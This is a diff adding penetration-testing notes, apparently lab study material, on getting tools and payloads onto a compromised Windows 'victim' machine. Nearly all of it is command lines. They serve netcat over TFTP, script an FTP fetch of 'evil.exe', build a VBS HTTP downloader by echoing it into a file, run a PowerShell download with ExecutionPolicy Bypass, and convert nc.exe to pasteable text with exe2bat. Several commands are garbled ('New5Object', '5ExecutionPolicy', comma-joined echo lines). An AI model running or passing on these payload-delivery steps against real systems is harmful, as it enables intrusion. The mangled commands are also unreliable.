@@ -1,0 +1,108 @@
+curl , wget to download files.
+
+in order to not lose the limited shell, we will make the session non interactive.
+
+TFTP is a UDP based file transfer. xp to 2003 contain this bydefault.
+7 above, need to be installed while windows installation.
+tftp is non interactive.
+
+setup tftp server on kali machine/attacker machine
+atftpd --daemon --port 69 /tftp    #tftp directory is the server directory
+cp /usr/share/windows-binaries/nc.exe /tftp/
+ on victim machin
+ tftp -i <tftpserverip> GET nc.exe  //will download from tftp server
+ 
+ 
+ FTP 
+ windows ftp is interactive program.
+ ftp /?
+ ftp -s:filename (non interactive way to download commands)
+apt-get isntall pure-ftpd //ftp server
+
+create file setup-ftp
+#!/bin/bash
+
+groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pw usereadd offsec -u ftpuser -d /ftphome
+pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+ln -s ../conf/PureDB 60pdb
+mkdir -p /ftphome
+chown -R ftpuser:ftpgroup /ftphome/
+/etc/init.d/pure-ftpd restart
+
+make a list of commands file
+
+echo open 192.168.30.5 21> ftp.txt
+echo offsec>>ftp.txt
+echo lab>> ftp.txt
+echo bin >> ftp.txt
+echo GET evil.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+
+on victim machine:
+copy and paste these commands so all commands will run automatically and exit.
+
+VBS script for xp and 2003 windows and powershell for 7,8 and above:
+
+below is http downloader script to be pasted in command line on target system.(its non interactive)
+
+echo,strUrl,=,WScript.Arguments.Item(0),>,wget.vbs,
+echo,StrFile,=,WScript.Arguments.Item(1),>>,wget.vbs,
+echo,Const,HTTPREQUEST_PROXYSETTING_DEFAULT,=,0,>>,wget.vbs,
+echo,Const,HTTPREQUEST_PROXYSETTING_PRECONFIG,=,0,>>,wget.vbs,
+echo,Const,HTTPREQUEST_PROXYSETTING_DIRECT,=,1,>>,wget.vbs,
+echo,Const,HTTPREQUEST_PROXYSETTING_PROXY,=,2,>>,wget.vbs,
+echo,Dim,http,,varByteArray,,strData,,strBuffer,,lngCounter,,fs,,ts,>>,wget.vbs,
+echo,,Err.Clear,>>,wget.vbs,
+echo,,Set,http,=,Nothing,>>,wget.vbs,
+echo,,Set,http,=,CreateObject("WinHttp.WinHttpRequest.5.1"),>>,wget.vbs,
+echo,,If,http,Is,Nothing,Then,Set,http,=,CreateObject("WinHttp.WinHttpRequest"),>>,wget.vbs,
+echo,,If,http,Is,Nothing,Then,Set,http,=,CreateObject("MSXML2.ServerXMLHTTP"),>>,wget.vbs,
+echo,,If,http,Is,Nothing,Then,Set,http,=,CreateObject("Microsoft.XMLHTTP"),>>,wget.vbs,
+echo,,http.Open,"GET",,strURL,,False,>>,wget.vbs,
+echo,,http.Send,>>,wget.vbs,
+echo,,varByteArray,=,http.ResponseBody,>>,wget.vbs,
+echo,,Set,http,=,Nothing,>>,wget.vbs,
+echo,,Set,fs,=,CreateObject("Scripting.FileSystemObject"),>>,wget.vbs,
+echo,,Set,ts,=,fs.CreateTextFile(StrFile,,True),>>,wget.vbs,
+echo,,strData,=,"",>>,wget.vbs,
+echo,,strBuffer,=,"",>>,wget.vbs,
+echo,,For,lngCounter,=,0,to,UBound(varByteArray),>>,wget.vbs,
+echo,,ts.Write,Chr(255,And,Ascb(Midb(varByteArray,lngCounter,+,1,,1))),>>,wget.vbs,
+echo,,Next,>>,wget.vbs,
+echo,,ts.Close,>>,wget.vbs,
+
+cscript+wget.vbs+http://192.168.10.5/evil.exe+evil.exe, (on victim machine,download from host location)
+
+
+POWERSHELL
+
+powersploit and nishang
+
+echo+$storageDir+=+$pwd+>+wget.ps1,
+echo+$webclient+=+New5Object+System.Net.WebClient+>>wget.ps1,
+echo+$url+=+"http://192.168.10.5/evil.exe"+>>wget.ps1+
+echo+$file+=+"new5exploit.exe"+>>wget.ps1+
+echo+$webclient.DownloadFile($url,$file)+>>wget.ps1
+
+powershell.exe+5ExecutionPolicy+Bypass+5NoLogo+5
+NonInteractive+5NoProfile+5File+wget.ps1
+
+
+
+file transfer via debug.exe
+it is an assembler,disassemble and hexdumping tool.
+file size limit is 64k
+
+cp /usr/share/windows-binaries/nc.exe /var/www
+ls -l nc.exe
+upx -9 nc.exe (compression tool to reduce the size further)
+
+wine exe2bat.exe nc.exe nc.txt (exe2bat will convert an exe into its txt file for file transfer)
+
+copy all text from nc.txt and paste it in the victim command prompt
+
+python -m SimpleHTTPServer 1337
